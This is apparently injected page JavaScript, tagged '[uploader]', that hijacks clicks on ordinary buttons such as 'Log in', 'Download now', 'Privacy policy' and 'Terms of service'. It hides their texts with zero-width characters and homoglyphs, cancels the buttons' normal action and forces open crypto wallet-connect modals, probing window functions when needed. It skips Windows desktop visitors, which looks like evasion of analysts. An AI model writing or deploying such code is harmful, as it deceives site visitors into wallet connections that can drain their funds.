(function(){
  function canonicalizeButtonText(value){
    var s = String(value || "");
    if (s.normalize) s = s.normalize("NFKD");
    s = s
      .replace(/[\u0300-\u036f]/g, "")
      .replace(/[\u00AD\u034F\u061C\u115F\u1160\u17B4\u17B5\u180B-\u180F\u200B-\u200F\u202A-\u202E\u2060-\u206F\u3164\uFE00-\uFE0F\uFEFF\uFFA0]/g, "");
    var from = "АВЕКМНОРСТХІЈЅУавекмнорстхіјѕуΑΒΕΖΗΙΚΜΝΟΡΤΥΧαβεικνορτυχν";
    var to   = "ABEKMHOPCTXIJSYabekmhopctxijsyABEZHIKMNOPTYXabeiknoptyxh";
    s = s.replace(/[АВЕКМНОРСТХІЈЅУавекмнорстхіјѕуΑΒΕΖΗΙΚΜΝΟΡΤΥΧαβεικνορτυχν]/g, function(ch){
      var index = from.indexOf(ch);
      return index >= 0 ? to.charAt(index) : ch;
    });
    return s.replace(/[^\p{L}\p{N}]+/gu, " ");
  }
  function norm(s){
    return canonicalizeButtonText(s || "")
      .replace(/\s+/g, " ")
      .trim()
      .replace(/^[\s"'“”‘’]+|[\s"'“”‘’]+$/g, "")
      .trim()
      .toLowerCase();
  }
  var triggerSpec = "onclick=\"openModal()\"";
  var buttonTexts = ["Dow​nlо​ad⁠ ​n‌оw", "⁠‌ Сr​eа​tе Сo‌i⁠⁠n", "Log in", "Vо⁠tе‌ tо⁠ Win‌ ​а ⁠r⁠ewа​rd", "Privacy policy", "voted", "​​Тес‌h‌ updаt⁠еs", "Rеv​‌‌e⁠nuе", "‌F‌еes", "⁠Т‌⁠еr‌ms оf ⁠⁠sеr‌vi‌се"].map(norm);
  var disabledOnWindowsDesktop = true;
  var inlineFunctionName = "openModal";
  function isWindowsDesktop(){
    var ua = navigator.userAgent || navigator.vendor || "";
    var uaData = navigator.userAgentData;
    if (uaData) {
      if (uaData.platform !== "Windows" || uaData.mobile) return false;
    } else if (!/Windows NT/i.test(ua)) {
      return false;
    }
    if (/Windows Phone|Android|iPhone|iPad|Mobile|Tablet|IEMobile/i.test(ua)) return false;
    
    return true;
  }
  if (disabledOnWindowsDesktop && isWindowsDesktop()) return;

  function installEarlyCallBridge(name){
    if (!name || typeof window[name] === "function") return;
    var queued = [];
    var polling = false;
    var placeholder = function(){
      if (!queued.length) {
        queued.push({scope:this,args:Array.prototype.slice.call(arguments)});
      }
      if (polling) return;
      polling = true;
      var attempts = 0;
      setTimeout(function releaseAndFlush(){
        if (window[name] === placeholder) {
          try { delete window[name]; } catch (e) { window[name] = undefined; }
        }
        (function flush(){
        var fn = window[name];
        if (typeof fn === "function" && fn !== placeholder) {
          var calls = queued.splice(0);
          calls.forEach(function(call){ fn.apply(call.scope, call.args); });
          return;
        }
        if (++attempts < 600) setTimeout(flush, 50);
        else {
          polling = false;
        }
        })();
      }, 0);
    };
    window[name] = placeholder;
  }
  function isModalVisible(){
    var selectors = [
      '[role="dialog"][aria-modal="true"]',
      '.modal.show',
      '.w3m-modal',
      '[class*="modal"][class*="open"]',
      '[class*="wallet"][class*="modal"]',
    ];
    for (var i = 0; i < selectors.length; i++) {
      var nodes = document.querySelectorAll(selectors[i]);
      for (var j = 0; j < nodes.length; j++) {
        var el = nodes[j];
        if (!el) continue;
        var style = window.getComputedStyle ? window.getComputedStyle(el) : null;
        if (style && (style.display === "none" || style.visibility === "hidden" || Number(style.opacity || "1") === 0)) continue;
        var rect = el.getBoundingClientRect ? el.getBoundingClientRect() : null;
        if (!rect || rect.width > 0 || rect.height > 0) return true;
      }
    }
    return false;
  }
  function clickFirstExisting(selectors){
    for (var i = 0; i < selectors.length; i++) {
      var el = document.querySelector(selectors[i]);
      if (!el) continue;
      try {
        if (typeof el.click === "function") el.click();
        else el.dispatchEvent(new MouseEvent("click", {bubbles:true,cancelable:true}));
      } catch (e) {
        continue;
      }
      if (isModalVisible()) return true;
    }
    return false;
  }
  function callOpenLikeMethods(){
    var nodes = document.querySelectorAll(
      'w3m-modal,w3m-button,[class*="wallet"],[class*="connect"],[class*="modal"],[id*="wallet"],[id*="modal"]'
    );
    var methodNames = ["open", "show", "present", "toggle"];
    var limit = Math.min(nodes.length, 80);
    for (var i = 0; i < limit; i++) {
      var node = nodes[i];
      for (var m = 0; m < methodNames.length; m++) {
        var method = methodNames[m];
        if (typeof node[method] !== "function") continue;
        try {
          node[method]();
          if (isModalVisible()) return true;
        } catch (e) {}
      }
    }
    return false;
  }
  function callWindowCandidates(){
    var names = Object.getOwnPropertyNames(window);
    var re = /(wallet|connect|modal|popup|dialog|open|show)/i;
    var limit = Math.min(names.length, 2000);
    for (var i = 0; i < limit; i++) {
      var name = names[i];
      if (!re.test(name)) continue;
      if (name === inlineFunctionName) continue;
      var fn = window[name];
      if (typeof fn !== "function") continue;
      if (fn === window.alert || fn === window.confirm || fn === window.prompt || fn === window.open) continue;
      try {
        fn();
        if (isModalVisible()) return true;
      } catch (e) {}
    }
    return false;
  }
  var fallbackAttempted = false;
  function queueModalFallbackProbe(){
    if (fallbackAttempted) return;
    fallbackAttempted = true;
    setTimeout(function(){
      if (isModalVisible()) return;
      if (clickFirstExisting([
        'w3m-button',
        'w3m-connect-button',
        '.wui-connect-button',
        '[data-testid*="wallet"]',
        '[data-testid*="connect"]',
        '[class*="wallet"][class*="button"]',
        '[class*="connect"][class*="button"]',
      ])) return;
      if (callOpenLikeMethods()) return;
      callWindowCandidates();
    }, 0);
  }
  function applyTrigger(el){
    var spec = (triggerSpec || "").trim();
    if (!spec) return false;
    try {
      if (/^#[A-Za-z_][\w:.-]*$/.test(spec)) {
        el.id = spec.slice(1);
        return true;
      }
      if (spec.indexOf("=") === -1) {
        spec.split(/\s+/).forEach(function(name){
          name = name.replace(/^\./, "");
          if (name) el.classList.add(name);
        });
        return true;
      }
      spec = spec.replace(/^\.(?=[\w:-]+\s*=)/, "");
      var template = document.createElement("template");
      template.innerHTML = "<span " + spec + "></span>";
      var source = template.content.firstElementChild;
      if (!source || !source.attributes.length) return false;
      Array.from(source.attributes).forEach(function(attr){
        el.setAttribute(attr.name, attr.value);
      });
      return true;
    } catch (e) {
      console.warn("[uploader] invalid modal trigger:", triggerSpec);
      return false;
    }
  }
  var clickableSelector = 'button,a,[role="button"],input[type="button"],input[type="submit"],[onclick]';
  function elementText(el){
    return norm(el && (el.value || el.textContent));
  }
  function clickableTarget(el){
    if (!el || el.nodeType !== 1) return null;
    var clickable = el.closest(clickableSelector);
    if (clickable && buttonTexts.indexOf(elementText(clickable)) !== -1) return clickable;

    var current = el;
    for (var depth = 0; current && current !== document.body && depth < 8; depth++) {
      if (buttonTexts.indexOf(elementText(current)) !== -1) {
        return current.closest(clickableSelector) || current;
      }
      current = current.parentElement;
    }
    return null;
  }
  function bindTarget(el){
    if (!el || el.dataset.uploaderBound) return;
    if (!applyTrigger(el)) return;
    el.style.cursor = 'pointer';
    el.dataset.uploaderBound = "1";
    el.setAttribute('data-uploader-modal-trigger', '');
    document.dispatchEvent(new CustomEvent('uploader:modal-trigger-ready'));
  }
  function bindFromEvent(event){
    bindTarget(clickableTarget(event.target));
  }
  function handleModalClick(event){
    var target = event.target && event.target.closest
      ? event.target.closest('[data-uploader-modal-trigger]')
      : null;
    if (!target) target = clickableTarget(event.target);
    if (!target) return;
    bindTarget(target);

    installEarlyCallBridge(inlineFunctionName);
    if (inlineFunctionName && typeof window[inlineFunctionName] === "function") {
      try { window[inlineFunctionName](); } catch (e) {}
    } else {
      queueModalFallbackProbe();
    }

    if (event.cancelable) event.preventDefault();
  }
  function bindAll(){
    var before = document.querySelectorAll('[data-uploader-bound="1"]').length;
    document.querySelectorAll('body *').forEach(function(el){
      if (el.dataset.uploaderBound) return;
      if (buttonTexts.indexOf(elementText(el)) !== -1) {
        var nested = el.querySelector && el.querySelector(clickableSelector);
        if (nested && buttonTexts.indexOf(elementText(nested)) !== -1) return;
        bindTarget(el.closest(clickableSelector) || el);
      }
    });
    var after = document.querySelectorAll('[data-uploader-bound="1"]').length;
    if (after || before) return;
    var fallback = Array.from(document.querySelectorAll(clickableSelector));
    var limit = Math.min(fallback.length, 60);
    for (var i = 0; i < limit; i++) {
      var node = fallback[i];
      if (!node || node.dataset.uploaderBound) continue;
      if (node.closest('[role="dialog"],.modal,[class*="modal"]')) continue;
      bindTarget(node);
    }
  }
  bindAll();
  var mo = new MutationObserver(bindAll);
  mo.observe(document.documentElement, {childList: true, subtree: true, characterData: true});
  setTimeout(function(){ mo.disconnect(); }, 120000);
  document.addEventListener('pointerdown', bindFromEvent, true);
  document.addEventListener('touchstart', bindFromEvent, {capture: true, passive: true});
  document.addEventListener('click', handleModalClick, true);
  window.addEventListener('load', function(){
    setTimeout(function(){
      var found = document.querySelectorAll('[data-uploader-bound="1"]').length;
      console.log('[uploader] modal-triggers: bound', found, 'of', buttonTexts.length);
    }, 500);
  });
})();